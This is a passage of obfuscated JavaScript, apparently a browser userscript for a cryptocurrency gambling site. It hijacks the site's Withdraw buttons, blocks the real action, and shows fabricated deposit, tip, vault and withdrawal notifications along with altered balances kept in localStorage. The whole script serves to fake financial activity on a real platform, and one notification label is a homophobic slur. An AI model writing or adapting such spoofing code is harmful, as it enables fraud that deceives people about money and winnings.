        const _0x422e43 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > div.stack.x-stretch.y-center.gap-none.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div.coin-toggle.svelte-1hjozqf > div > div > button > div > div > div.value-ctainer.svelte-1la41np > span:nth-child(1) > span");
        const _0x3bafb1 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > div.stack.x-stretch.y-center.gap-none.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div.coin-toggle.svelte-1hjozqf > div > div > button > div > div > div.value-ctainer.svelte-1la41np > span:nth-child(2) > span > span:nth-child(1)");
        const _0x1683c2 = _0x264fba();
        const _0x487ca4 = parseFloat(_0x1683c2.innerText.replace(/[^\d.]/g, ''));
        const _0x2b7444 = {
          'usd': {
            'ltc': _0x58a80a,
            'eth': _0x120044,
            'pol': _0x15c063,
            'btc': _0xfd6c3e,
            'usdt': 0x1
          },
          'eur': {
            'ltc': _0x262b8b,
            'eth': _0x124372,
            'matic': _0x21c78d,
            'btc': _0x217262
          }
        };
        let _0xe938f8;
        let _0x5bfae2;
        function _0x391354() {
          const _0x456dd2 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > label:nth-child(2) > div > div.input-content.svelte-1nbx5re > input");
          let _0x25912b = _0x456dd2.cloneNode(true);
          const _0x45d6ca = {
            'usd': {
              'ltc': _0x58a80a,
              'eth': _0x120044,
              'pol': _0x15c063,
              'btc': _0xfd6c3e,
              'usdt': 0x1
            },
            'eur': {
              'ltc': _0x262b8b,
              'eth': _0x124372,
              'matic': _0x21c78d,
              'btc': _0x217262
            }
          };
          _0x4c0a89 = _0x25912b;
          _0x456dd2.parentNode.replaceChild(_0x25912b, _0x456dd2);
          const _0x1c23c0 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
          const _0x294e59 = _0x45d6ca.usd[_0x48a9fe];
          _0x25912b.addEventListener("input", () => {
            let _0x124480 = parseFloat(_0x25912b.value);
            if (isNaN(_0x124480)) {
              _0x1c23c0.innerText = 0x0.toFixed(0x8) + " " + _0x48a9fe.toUpperCase();
            } else {
              let _0x20f506;
              _0x20f506 = "eur" === _0xbe34bd ? _0x124480 * _0x124a7d : 'inr' === _0xbe34bd ? _0x124480 / _0x368347 : _0x124480;
              _0x308ca7 = (_0x124480 + _0x6bf9f7).toFixed(0x2);
              _0x1c23c0.innerText = (_0x20f506 / _0x294e59).toFixed(0x8) + " " + _0x48a9fe.toUpperCase();
            }
          });
          _0x25912b.addEventListener("change", () => {
            let _0x542cb6 = parseFloat(_0x25912b.value);
            if (isNaN(_0x542cb6)) {
              _0x25912b.value = "0.00";
            } else {
              _0x25912b.value = _0x542cb6.toFixed(0x2);
            }
          });
        }
        function _0x5810e2(_0xedd9a) {
          const _0x4ef1dc = document.querySelector(_0xedd9a);
          if (_0x4ef1dc) {
            if ("Withdraw" === _0x4ef1dc.innerText.trim()) {
              const _0x389233 = _0x4ef1dc.cloneNode(true);
              _0x4ef1dc.parentNode.replaceChild(_0x389233, _0x4ef1dc);
              _0x389233.addEventListener("click", function (_0x51ae10) {
                _0x51ae10.stopImmediatePropagation();
                _0x51ae10.preventDefault();
                _0x389233.innerHTML = '';
                _0x389233.disabled = true;
                const _0x1cb87c = document.createElement("div");
                _0x1cb87c.innerHTML = "\n      <div class=\"inline-flex justify-center items-center absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2\">\n        <div class=\"loader svelte-5ovsvp\">\n          <div class=\"dot dot-one svelte-5ovsvp\"></div>\n          <div class=\"dot dot-two svelte-5ovsvp\"></div>\n        </div>\n      </div>\n    ";
                _0x389233.appendChild(_0x1cb87c);
                const _0x1d6422 = 0x384 * Math.random() + 0x1f4;
                setTimeout(() => {
                  _0x51738a(_0x308ca7, _0x6bf9f7);
                  _0x389233.disabled = false;
                  _0x389233.innerHTML = 'Withdraw';
                }, _0x1d6422);
              }, true);
            } else {
              setTimeout(() => _0x5810e2(_0xedd9a), 0x14);
            }
          } else {
            if (_0x245fd7 > 0x41) {
              return void (_0x245fd7 = 0x0);
            }
            _0x245fd7 += 0x1;
            setTimeout(() => _0x5810e2(_0xedd9a), 0x64);
          }
        }
        function _0x51738a(_0x4c4fcf, _0x2cdb48 = 0x0) {
          let _0x33edf2;
          let _0x20acdc;
          if (_0x2cdb48 > 0x0) {
            if ("ltc" === _0x48a9fe) {
              _0x20acdc = (_0x4c4fcf - _0x2cdb48).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              _0x33edf2 = _0x41155a('withdraw_ltc');
            } else if ("eth" === _0x48a9fe) {
              _0x20acdc = (_0x4c4fcf - _0x2cdb48).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              _0x33edf2 = _0x41155a("withdraw_eth");
            } else if ("pol" === _0x48a9fe) {
              _0x20acdc = (_0x4c4fcf - _0x2cdb48).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              _0x33edf2 = _0x41155a('withdraw_matic');
            } else if ("btc" === _0x48a9fe) {
              _0x20acdc = (_0x4c4fcf - _0x2cdb48).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
              _0x33edf2 = _0x41155a("withdraw_btc");
            }
          } else if ("ltc" === _0x48a9fe) {
            _0x20acdc = _0x4c4fcf.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            _0x33edf2 = _0x41155a("withdraw_ltc");
          } else if ("eth" === _0x48a9fe) {
            _0x20acdc = _0x4c4fcf.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            _0x33edf2 = _0x41155a("withdraw_eth");
          } else if ('pol' === _0x48a9fe) {
            _0x20acdc = _0x4c4fcf.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            _0x33edf2 = _0x41155a("withdraw_matic");
          } else if ("btc" === _0x48a9fe) {
            _0x20acdc = _0x4c4fcf.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
            _0x33edf2 = _0x41155a("withdraw_btc");
          }
          (function (_0x18f3a8, _0x2ffb89) {
            const _0x48014f = _0x18f3a8.querySelector(".weight-normal.line-height-default.align-left.size-default.text-size-default.variant-subtle.numeric.with-icon-space.is-truncate.svelte-17v69ua span");
            if (_0x48014f) {
              const _0x1096a8 = _0x369ea9[_0xbe34bd];
              _0x48014f.textContent = _0x1096a8 + _0x2ffb89;
            }
          })(_0x33edf2, _0x20acdc);
          _0x4dfab7(".notification-list.svelte-18t4teo[style=\"z-index: 1700\"]", _0x33edf2);
          const _0x163927 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > label:nth-child(2) > div > div.input-content.svelte-1nbx5re > input");
          const _0x57ae33 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
          const _0x32e75f = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > div.stack.x-stretch.y-center.gap-none.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div.coin-toggle.svelte-1hjozqf > div > div > button > div > div > div.value-ctainer.svelte-1la41np > span:nth-child(1) > span");
          const _0x4d8163 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > div.stack.x-stretch.y-center.gap-none.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div.coin-toggle.svelte-1hjozqf > div > div > button > div > div > div.value-ctainer.svelte-1la41np > span:nth-child(2) > span > span:nth-child(1)");
          const _0x19753b = _0x264fba();
          const _0x5441aa = (parseFloat(_0x19753b.innerText.replace(/[^\d.]/g, '')) - _0x4c4fcf).toFixed(0x2);
          const _0x519f78 = _0x369ea9[_0xbe34bd];
          const _0x1c3260 = _0x2b7444.usd[_0x48a9fe];
          _0x19753b.innerText = _0x519f78 + _0x5441aa.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          localStorage.setItem("latest_bal", _0x5441aa);
          _0x32e75f.innerText = "eur" === _0xbe34bd ? (_0x5441aa * _0x124a7d / _0x1c3260).toFixed(0x8) : 'inr' === _0xbe34bd ? (_0x5441aa / _0x368347 / _0x1c3260).toFixed(0x8) : (_0x5441aa / _0x1c3260).toFixed(0x8);
          _0x4d8163.innerText = _0x519f78 + _0x5441aa.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          _0x57ae33.innerText = "0.00000000 " + _0x48a9fe.toUpperCase();
          _0x163927.value = "0.00";
          document.querySelector("#modal-scroll > div > div > div > div > div > div > form > label:nth-child(4) > div > div.input-content.svelte-1nbx5re > input").value = '';
          document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > label:nth-child(3) > div > div.input-content.svelte-1nbx5re > input").value = '';
        }
        if ("usd" === _0xbe34bd) {
          _0x5bfae2 = _0x487ca4;
          _0xe938f8 = _0x2b7444.usd[_0x48a9fe];
        } else if ("eur" === _0xbe34bd) {
          _0x5bfae2 = _0x487ca4 * _0x124a7d;
          _0xe938f8 = _0x2b7444.usd[_0x48a9fe];
        } else if ("inr" === _0xbe34bd) {
          _0x5bfae2 = _0x487ca4 / _0x368347;
          _0xe938f8 = _0x2b7444.usd[_0x48a9fe];
        }
        _0x422e43.innerText = (_0x5bfae2 / _0xe938f8).toFixed(0x8);
        _0x3bafb1.innerText = _0x1683c2.innerText;
        setTimeout(() => {
          const _0x4d346d = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > p > div:nth-child(2) > span.content.svelte-didcjq > span > span").innerText;
          const _0x417c03 = _0x369ea9[_0xbe34bd];
          _0x6bf9f7 = parseFloat(_0x4d346d.replace(_0x417c03, ''));
        }, 0x352);
        const _0x4d8add = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > label:nth-child(2) > div > div.input-button-wrap.svelte-1nbx5re > button");
        let _0x245fd7 = 0x0;
        if (_0x4d8add) {
          _0x5810e2("#modal-scroll > div > div > div > div > div > div > form > button");
          _0x391354();
          _0x4d8add.addEventListener("click", () => {
            const _0x16da46 = {
              'usd': {
                'ltc': _0x58a80a,
                'eth': _0x120044,
                'pol': _0x15c063,
                'btc': _0xfd6c3e,
                'usdt': 0x1
              },
              'eur': {
                'ltc': _0x262b8b,
                'eth': _0x124372,
                'matic': _0x21c78d,
                'btc': _0x217262
              }
            };
            let _0xa4ba18;
            let _0x326582;
            if ('usd' === _0xbe34bd) {
              _0x326582 = _0x487ca4 - _0x6bf9f7;
              _0xa4ba18 = _0x16da46.usd[_0x48a9fe];
            } else if ("eur" === _0xbe34bd) {
              _0x326582 = (_0x487ca4 - _0x6bf9f7) * _0x124a7d;
              _0xa4ba18 = _0x16da46.usd[_0x48a9fe];
            } else if ('inr' === _0xbe34bd) {
              _0x326582 = (_0x487ca4 - _0x6bf9f7) / _0x368347;
              _0xa4ba18 = _0x16da46.usd[_0x48a9fe];
            }
            _0x1cc913.innerText = (_0x326582 / _0xa4ba18).toFixed(0x8) + " " + _0x48a9fe.toUpperCase();
            _0x4c0a89.value = (_0x487ca4 - _0x6bf9f7).toFixed(0x2);
            _0x308ca7 = _0x487ca4.toFixed(0x2);
          });
        }
        setTimeout(() => {
          _0x592df3.observe(document.documentElement, {
            'childList': true,
            'subtree': true
          });
        }, 0x7d0);
      }
    }).observe(document.documentElement, {
      'childList': true,
      'subtree': true
    });
  }
  function _0x63af73(_0x43c5bd, _0x4221c3, _0x793147) {
    return new Promise(_0x104790 => {
      const _0x432f00 = () => {
        if (_0x43c5bd()) {
          _0x104790();
        } else {
          setTimeout(_0x432f00, _0x4221c3);
        }
      };
      _0x432f00();
    });
  }
  function _0x41155a(_0x5a7b35) {
    const _0x42a47a = localStorage.getItem(_0x5a7b35);
    if (!_0x42a47a) {
      return null;
    }
    return new DOMParser().parseFromString(_0x42a47a, "text/xml").documentElement;
  }
  function _0x5c7e3e(_0x25413a, _0x3ff709, _0x4e5280) {
    const _0x58289c = _0x25413a.querySelector(".weight-normal.line-height-default.align-left.size-default.text-size-default.variant-subtle.numeric.with-icon-space.is-truncate.svelte-17v69ua span");
    if (_0x58289c) {
      const _0x478c0c = Number(_0x4e5280.replace(/,/g, ''));
      if (!isNaN(_0x478c0c)) {
        const _0x3a2c59 = _0x369ea9[_0xbe34bd];
        _0x58289c.textContent = _0x3a2c59 + _0x4e5280;
      }
    }
    const _0x4fc6dc = _0x25413a.firstElementChild.firstElementChild.childNodes[0x2].firstChild.firstChild;
    const _0x441d0e = _0x25413a.firstElementChild.firstElementChild.childNodes[0x2].lastElementChild.firstChild.childNodes[0x0];
    const _0x1a4c68 = _0x25413a.firstElementChild.firstElementChild.childNodes[0x2].lastElementChild.firstChild.childNodes[0x2];
    const _0x1fdc74 = _0x25413a.querySelector('.notification.default.normal.svelte-tm583l');
    const _0x989524 = _0x25413a.querySelector("svg path");
    if (0x2 === _0x3ff709) {
      _0x4fc6dc.innerText = "Deposit Confirmed";
      if (_0x441d0e && _0x441d0e.nodeType === Node.TEXT_NODE) {
        _0x441d0e.textContent = "Your deposit of ";
      }
      if (_0x1a4c68 && _0x1a4c68.nodeType === Node.TEXT_NODE) {
        _0x1a4c68.textContent = " has been successfully processed.";
      }
      if (_0x1fdc74) {
        _0x1fdc74.className = "notification positive normal svelte-tm583l";
      }
      if (_0x989524) {
        _0x989524.setAttribute('d', "M45.71 13.349v.024c0 4.316-2.076 8.146-5.32 10.57H24.61l-.034-.024a13.19 13.19 0 0 1-5.286-10.57c0-7.296 5.914-13.21 13.21-13.21 7.296 0 13.21 5.914 13.21 13.21Zm4.806 22.844H62.23v-3.19a5.31 5.31 0 0 0-5.3-5.31H10.14a5.624 5.624 0 0 1-5.24-5.608v-.014a4.914 4.914 0 0 1 0-.522v.012a5.546 5.546 0 0 1 5.51-5.11h3.85a17.489 17.489 0 0 1-.26-2.88v-.01H7.06A7.07 7.07 0 0 0 0 20.63v37.1a6.14 6.14 0 0 0 6.13 6.13h50.79a5.31 5.31 0 0 0 5.31-5.31v-3.19H50.5c-.092.004-.2.006-.31.006-5.296 0-9.59-4.294-9.59-9.59s4.294-9.59 9.59-9.59c.108 0 .218.002.326.006Zm4.733-22.63v2.89h-4.516a18.36 18.36 0 0 0 .267-2.89h4.25Zm-4.516 2.89-.02.11.017-.11h.003ZM8.66 21.983c0-.98.792-1.774 1.77-1.78h4.91l.044.122a17.843 17.843 0 0 0 1.956 3.618h-6.91a1.77 1.77 0 0 1-1.77-1.77v-.19ZM64 39.943v11.67l-13.488-.002a5.84 5.84 0 0 1-6.094-5.834 5.84 5.84 0 0 1 6.082-5.834H64Zm-13.06 8.5a2.67 2.67 0 0 0 2.67-2.66v-.01a2.67 2.67 0 1 0-2.67 2.67Zm-1.26-28.24a18.188 18.188 0 0 1-1.998 3.74h-.002l-.038.058.04-.058H58v-3.74h-8.32Z");
      }
    } else if (0x3 === _0x3ff709) {
      _0x4fc6dc.innerText = "Tip Received";
      if (_0x441d0e && _0x441d0e.nodeType === Node.TEXT_NODE) {
        _0x441d0e.textContent = "You received ";
      }
      if (_0x1a4c68 && _0x1a4c68.nodeType === Node.TEXT_NODE) {
        _0x1a4c68.textContent = " from lilNasX.";
      }
    } else if (0x10 === _0x3ff709) {
      _0x4fc6dc.innerText = "Vault Deposit";
      if (_0x441d0e && _0x441d0e.nodeType === Node.TEXT_NODE) {
        _0x441d0e.textContent = '';
      }
      if (_0x1a4c68 && _0x1a4c68.nodeType === Node.TEXT_NODE) {
        _0x1a4c68.textContent = " deposited to vault.";
      }
      if (_0x1fdc74) {
        _0x1fdc74.className = "notification positive normal svelte-tm583l";
      }
      if (_0x989524) {
        _0x989524.setAttribute('d', "M45.71 13.349v.024c0 4.316-2.076 8.146-5.32 10.57H24.61l-.034-.024a13.19 13.19 0 0 1-5.286-10.57c0-7.296 5.914-13.21 13.21-13.21 7.296 0 13.21 5.914 13.21 13.21Zm4.806 22.844H62.23v-3.19a5.31 5.31 0 0 0-5.3-5.31H10.14a5.624 5.624 0 0 1-5.24-5.608v-.014a4.914 4.914 0 0 1 0-.522v.012a5.546 5.546 0 0 1 5.51-5.11h3.85a17.489 17.489 0 0 1-.26-2.88v-.01H7.06A7.07 7.07 0 0 0 0 20.63v37.1a6.14 6.14 0 0 0 6.13 6.13h50.79a5.31 5.31 0 0 0 5.31-5.31v-3.19H50.5c-.092.004-.2.006-.31.006-5.296 0-9.59-4.294-9.59-9.59s4.294-9.59 9.59-9.59c.108 0 .218.002.326.006Zm4.733-22.63v2.89h-4.516a18.36 18.36 0 0 0 .267-2.89h4.25Zm-4.516 2.89-.02.11.017-.11h.003ZM8.66 21.983c0-.98.792-1.774 1.77-1.78h4.91l.044.122a17.843 17.843 0 0 0 1.956 3.618h-6.91a1.77 1.77 0 0 1-1.77-1.77v-.19ZM64 39.943v11.67l-13.488-.002a5.84 5.84 0 0 1-6.094-5.834 5.84 5.84 0 0 1 6.082-5.834H64Zm-13.06 8.5a2.67 2.67 0 0 0 2.67-2.66v-.01a2.67 2.67 0 1 0-2.67 2.67Zm-1.26-28.24a18.188 18.188 0 0 1-1.998 3.74h-.002l-.038.058.04-.058H58v-3.74h-8.32Z");
      }
    } else if (0x11 === _0x3ff709) {
      _0x4fc6dc.innerText = "Vault Withdrawal";
      if (_0x441d0e && _0x441d0e.nodeType === Node.TEXT_NODE) {
        _0x441d0e.textContent = '';
      }
      if (_0x1a4c68 && _0x1a4c68.nodeType === Node.TEXT_NODE) {
        _0x1a4c68.textContent = " withdrawn from vault confirmed.";
      }
      if (_0x1fdc74) {
        _0x1fdc74.className = "notification positive normal svelte-tm583l";
      }
      if (_0x989524) {
        _0x989524.setAttribute('d', "M45.71 13.349v.024c0 4.316-2.076 8.146-5.32 10.57H24.61l-.034-.024a13.19 13.19 0 0 1-5.286-10.57c0-7.296 5.914-13.21 13.21-13.21 7.296 0 13.21 5.914 13.21 13.21Zm4.806 22.844H62.23v-3.19a5.31 5.31 0 0 0-5.3-5.31H10.14a5.624 5.624 0 0 1-5.24-5.608v-.014a4.914 4.914 0 0 1 0-.522v.012a5.546 5.546 0 0 1 5.51-5.11h3.85a17.489 17.489 0 0 1-.26-2.88v-.01H7.06A7.07 7.07 0 0 0 0 20.63v37.1a6.14 6.14 0 0 0 6.13 6.13h50.79a5.31 5.31 0 0 0 5.31-5.31v-3.19H50.5c-.092.004-.2.006-.31.006-5.296 0-9.59-4.294-9.59-9.59s4.294-9.59 9.59-9.59c.108 0 .218.002.326.006Zm4.733-22.63v2.89h-4.516a18.36 18.36 0 0 0 .267-2.89h4.25Zm-4.516 2.89-.02.11.017-.11h.003ZM8.66 21.983c0-.98.792-1.774 1.77-1.78h4.91l.044.122a17.843 17.843 0 0 0 1.956 3.618h-6.91a1.77 1.77 0 0 1-1.77-1.77v-.19ZM64 39.943v11.67l-13.488-.002a5.84 5.84 0 0 1-6.094-5.834 5.84 5.84 0 0 1 6.082-5.834H64Zm-13.06 8.5a2.67 2.67 0 0 0 2.67-2.66v-.01a2.67 2.67 0 1 0-2.67 2.67Zm-1.26-28.24a18.188 18.188 0 0 1-1.998 3.74h-.002l-.038.058.04-.058H58v-3.74h-8.32Z");
      }
    } else if (0x63 === _0x3ff709) {
      _0x4fc6dc.innerText = "Gay Alert!";
      _0x25413a.firstElementChild.firstElementChild.childNodes[0x2].lastElementChild.innerText = _0x4e5280;
    } else {
      _0x4fc6dc.innerText = "Deposit Pending";
      if (_0x441d0e && _0x441d0e.nodeType === Node.TEXT_NODE) {
        _0x441d0e.textContent = "Your deposit of ";
      }
      if (_0x1a4c68 && _0x1a4c68.nodeType === Node.TEXT_NODE) {
        _0x1a4c68.textContent = " has been registered and awaiting confirmation.";
      }
      if (_0x1fdc74) {
        _0x1fdc74.className = "notification positive normal svelte-tm583l";
      }
      if (_0x989524) {
        _0x989524.setAttribute('d', "M45.71 13.349v.024c0 4.316-2.076 8.146-5.32 10.57H24.61l-.034-.024a13.19 13.19 0 0 1-5.286-10.57c0-7.296 5.914-13.21 13.21-13.21 7.296 0 13.21 5.914 13.21 13.21Zm4.806 22.844H62.23v-3.19a5.31 5.31 0 0 0-5.3-5.31H10.14a5.624 5.624 0 0 1-5.24-5.608v-.014a4.914 4.914 0 0 1 0-.522v.012a5.546 5.546 0 0 1 5.51-5.11h3.85a17.489 17.489 0 0 1-.26-2.88v-.01H7.06A7.07 7.07 0 0 0 0 20.63v37.1a6.14 6.14 0 0 0 6.13 6.13h50.79a5.31 5.31 0 0 0 5.31-5.31v-3.19H50.5c-.092.004-.2.006-.31.006-5.296 0-9.59-4.294-9.59-9.59s4.294-9.59 9.59-9.59c.108 0 .218.002.326.006Zm4.733-22.63v2.89h-4.516a18.36 18.36 0 0 0 .267-2.89h4.25Zm-4.516 2.89-.02.11.017-.11h.003ZM8.66 21.983c0-.98.792-1.774 1.77-1.78h4.91l.044.122a17.843 17.843 0 0 0 1.956 3.618h-6.91a1.77 1.77 0 0 1-1.77-1.77v-.19ZM64 39.943v11.67l-13.488-.002a5.84 5.84 0 0 1-6.094-5.834 5.84 5.84 0 0 1 6.082-5.834H64Zm-13.06 8.5a2.67 2.67 0 0 0 2.67-2.66v-.01a2.67 2.67 0 1 0-2.67 2.67Zm-1.26-28.24a18.188 18.188 0 0 1-1.998 3.74h-.002l-.038.058.04-.058H58v-3.74h-8.32Z");
      }
    }
  }
  let _0xb330ee = false;
  function _0x2681cf() {
    const _0xe7e3d9 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > div > div > div > button > div > div > span.content.svelte-didcjq > span > span");
    if (!_0xe7e3d9) {
      return void setTimeout(_0x2681cf, 0x64);
    }
    const _0x3971b4 = Number(localStorage.getItem(_0x48a9fe + '_vault'));
    const _0x24b005 = _0x3971b4.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    _0xe7e3d9.innerText = _0x369ea9[_0xbe34bd] + _0x24b005;
    const _0x267624 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > label > div > div.input-content.svelte-1nbx5re > input");
    const _0x55166b = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > label > span > div.currency-conversion.svelte-e4myuj > div > div");
    const _0x291d3e = _0x267624.cloneNode(true);
    _0x267624.parentNode.replaceChild(_0x291d3e, _0x267624);
    const _0xbd3e2b = {
      'usd': {
        'ltc': _0x58a80a,
        'eth': _0x120044,
        'pol': _0x15c063,
        'btc': _0xfd6c3e,
        'usdt': 0x1
      },
      'eur': {
        'ltc': _0x262b8b,
        'eth': _0x124372,
        'matic': _0x21c78d,
        'btc': _0x217262
      }
    };
    let _0x44206f = 0x0;
    _0x291d3e.addEventListener('input', _0x330f6e => {
      let _0x17fc9f;
      let _0x1732e2;
      if ("usd" === _0xbe34bd) {
        _0x1732e2 = _0x330f6e.target.value;
        _0x17fc9f = _0xbd3e2b.usd[_0x48a9fe];
      } else if ('eur' === _0xbe34bd) {
        _0x1732e2 = _0x330f6e.target.value * _0x124a7d;
        _0x17fc9f = _0xbd3e2b.usd[_0x48a9fe];
      } else if ("inr" === _0xbe34bd) {
        _0x1732e2 = _0x330f6e.target.value / _0x368347;
        _0x17fc9f = _0xbd3e2b.usd[_0x48a9fe];
      }
      const _0x402d95 = (_0x1732e2 / _0x17fc9f).toFixed(0x8);
      _0x55166b.innerText = _0x402d95 + " " + _0x48a9fe.toUpperCase();
    });
    _0x291d3e.addEventListener('blur', _0x3f7d7f => {
      _0x291d3e.value = Number(_0x3f7d7f.target.value).toFixed(0x2);
    });
    document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > div:nth-child(3) > button").addEventListener("click", _0x1deb32 => {
      let _0x4f61dd;
      let _0xe086bf;
      _0x1deb32.preventDefault();
      _0x1deb32.stopPropagation();
      _0x291d3e.value = _0x3971b4.toFixed(0x2);
      if ("usd" === _0xbe34bd) {
        _0xe086bf = parseFloat(_0x291d3e.value);
        _0x4f61dd = _0xbd3e2b.usd[_0x48a9fe];
      } else if ("eur" === _0xbe34bd) {
        _0xe086bf = parseFloat(_0x291d3e.value) * _0x124a7d;
        _0x4f61dd = _0xbd3e2b.usd[_0x48a9fe];
      } else if ('inr' === _0xbe34bd) {
        _0xe086bf = parseFloat(_0x291d3e.value) / _0x368347;
        _0x4f61dd = _0xbd3e2b.usd[_0x48a9fe];
      }
      if (isNaN(_0xe086bf) || isNaN(_0x4f61dd)) {
        console.error("Invalid calculation. Check inputs:", {
          'desiredNumberz': _0xe086bf,
          'ratebb': _0x4f61dd
        });
        return void (_0x55166b.innerText = "0.00000000 " + _0x48a9fe.toUpperCase());
      }
      if (_0x4f61dd <= 0x0) {
        console.error("Exchange rate is invalid or zero:", _0x4f61dd);
        return void (_0x55166b.innerText = "0.00000000 " + _0x48a9fe.toUpperCase());
      }
      const _0x4a0b45 = (_0xe086bf / _0x4f61dd).toFixed(0x8);
      _0x55166b.innerText = _0x4a0b45 + " " + _0x48a9fe.toUpperCase();
    });
    const _0x4b3ed3 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > div:nth-child(3) > button");
    const _0x392984 = _0x3476a7 => {
      const _0x1e406e = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > div:nth-child(3) > button");
      _0x1e406e.disabled = true;
      const _0x410647 = document.createElement("div");
      _0x410647.innerHTML = "\n<div class=\"inline-flex justify-center items-center absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2\">\n    <div class=\"loader svelte-5ovsvp\">\n        <div class=\"dot dot-one svelte-5ovsvp\"></div>\n        <div class=\"dot dot-two svelte-5ovsvp\"></div>\n    </div>\n</div>";
      document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > div:nth-child(3) > button > div").classList.add("invisible");
      _0x1e406e.appendChild(_0x410647);
      const _0x20e356 = Math.floor(0xc9 * Math.random()) + 0x96;
      setTimeout(() => {
        let _0x141efc;
        _0x1e406e.disabled = false;
        document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > div:nth-child(3) > button > div").classList.remove("invisible");
        _0x410647.parentNode.removeChild(_0x410647);
        if ("ltc" === _0x48a9fe) {
          _0x141efc = _0x41155a("withdraw_ltc");
        } else if ("eth" === _0x48a9fe) {
          _0x141efc = _0x41155a("withdraw_eth");
        } else if ('pol' === _0x48a9fe) {
          _0x141efc = _0x41155a("withdraw_matic");
        } else if ("btc" === _0x48a9fe) {
          _0x141efc = _0x41155a("withdraw_btc");
        }
        const _0x118c8f = _0x141efc.cloneNode(true);
        _0x5c7e3e(_0x118c8f, 0x11, Number(_0x291d3e.value).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','));
        localStorage.setItem(_0x48a9fe + "_vault", _0x3971b4 - Number(_0x291d3e.value));
        _0x4dfab7(".notification-list.svelte-18t4teo[style=\"z-index: 1700\"]", _0x118c8f);
        const _0x43ee1a = parseFloat(_0x264fba().innerText.replace(/[^\d.]/g, ''));
        const _0x811515 = (_0x43ee1a + Number(_0x291d3e.value)).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        localStorage.setItem("latest_bal", (_0x43ee1a + Number(_0x291d3e.value)).toFixed(0x2));
        _0x264fba().innerText = _0x369ea9[_0xbe34bd] + _0x811515;
        _0x291d3e.value = "0.00";
        document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > label > span > div.currency-conversion.svelte-e4myuj > div > div").innerText = 0x0.toFixed(0x8) + " " + _0x48a9fe.toUpperCase();
        _0xe7e3d9.innerText = _0x369ea9[_0xbe34bd] + Number(localStorage.getItem(_0x48a9fe + "_vault")).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
      }, _0x20e356);
    };
    _0x4b3ed3.addEventListener("click", function _0x49ff85(_0x5a315b) {
      if (_0xb330ee) {
        return;
      }
      const _0x44ea22 = document.querySelector(_0x5a315b);
      if (_0x44ea22) {
        if ("Withdraw from Vault" === _0x44ea22.innerText.trim()) {
          const _0x5bb6c7 = _0x44ea22.cloneNode(true);
          _0x44ea22.parentNode.replaceChild(_0x5bb6c7, _0x44ea22);
          _0x5bb6c7.addEventListener("click", function (_0x1bea2d) {
            _0x1bea2d.preventDefault();
            _0x392984();
          });
        } else {
          setTimeout(() => _0x49ff85(_0x5a315b), 0x14);
        }
      } else {
        if (_0x44206f > 0x41) {
          return void (_0x44206f = 0x0);
        }
        _0x44206f += 0x1;
        setTimeout(() => _0x49ff85(_0x5a315b), 0x64);
      }
    }("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > div:nth-child(3) > button"));
  }
  function _0x4dfab7(_0x2c3a68, _0x24eb58, _0x427324 = 0x1388) {
    const _0x4d9726 = document.querySelector(_0x2c3a68);
    if (!_0x4d9726) {
      return;
    }
    let _0x348527;
    _0x4d9726.insertBefore(_0x24eb58, _0x4d9726.firstChild);
    let _0x3b2562 = _0x427324;
    let _0x485da0 = Date.now();
    const _0xb13e34 = () => {
      _0x485da0 = Date.now();
      _0x348527 = setTimeout(() => {
        _0x4d9726.removeChild(_0x24eb58);
